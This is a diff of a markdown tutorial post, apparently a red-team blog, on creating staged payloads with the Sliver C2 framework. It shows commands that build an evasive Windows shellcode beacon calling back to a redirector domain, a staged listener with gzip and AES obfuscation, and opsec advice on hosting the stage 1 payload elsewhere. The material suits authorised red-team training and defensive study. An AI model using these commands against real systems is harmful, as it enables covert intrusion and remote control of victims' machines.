@@ -102,17 +102,18 @@ Useful links:
 - https://github.com/BishopFox/sliver/wiki/Stagers
 - https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/
 
-To create staged payloads, we'll need to create two things: a **profile** and a **staged listener**. 
+To create staged payloads, we'll need to create two things: a **profile** and a **staged listener**. The profile will act as a configuration for our stage 2 payoad, and the staged listener will be a stage 1 listener/payload
 
-First, to create a **profile**, use the following command which is similar to how we createed Windows shellcode. This will create the profile 'https-win':<br />
+First, to create a **profile**, use the following command which is similar to how we previously createed Windows shellcode. This will create the profile 'https-win':<br />
 `profiles new beacon --http https://sliver-redirector.com --os windows --format shellcode --evasion https-win`
 Type `profiles and you should see your 'https-win' profile created.
 ![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/20dd9587-79df-40c7-bb91-dd7c7bd8aee2)
 
-
-Next, we need to create a staged listener thta links to our profile. In this case, I obfuscated the staged payload using gzip compression and AES encryption. <br />
+Next, we need to create a staged listener that links to our profile. In this case, I obfuscated the staged payload using gzip compression and AES encryption. <br />
 `stage-listener --url http://sliver-domain:80 --profile https-win --compress gzip --aes-encrypt-key "1234567890123456" --aes-encrypt-iv "SomeRandomIVHere"`
 ![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/ae2aa7e6-9e9d-4812-8d53-681651c30608)
+
+**Note:** *If you're using your Sliver C2 server to host the stage 1 payload, you need to set it up on a different protocol/port as your HTTPS listener. Alternatively, you can set it up, download the shellcode then host it anywhere else for better opsec (i.e. a cloud provider).*
 
 Beacon received from staged listener payload:
 ![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/12d8f0df-a5d2-440f-972f-cd091a38b738)
